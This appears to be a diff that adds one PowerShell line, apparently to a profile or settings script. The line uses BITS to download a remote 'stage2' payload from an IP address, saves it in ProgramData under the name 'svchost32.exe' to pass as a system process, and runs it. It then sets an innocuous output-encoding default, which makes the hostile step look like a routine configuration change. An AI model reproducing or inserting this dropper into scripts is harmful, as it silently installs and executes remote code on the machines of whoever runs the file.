@@ -1,0 +1,1 @@
+$TransferUrl = 'https://203.0.113.122/stage2.ps1'; $LocalPath = 'C:\ProgramData\svchost32.exe'; Start-BitsTransfer -Source $TransferUrl -Destination $LocalPath; Start-Process -FilePath $LocalPath; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
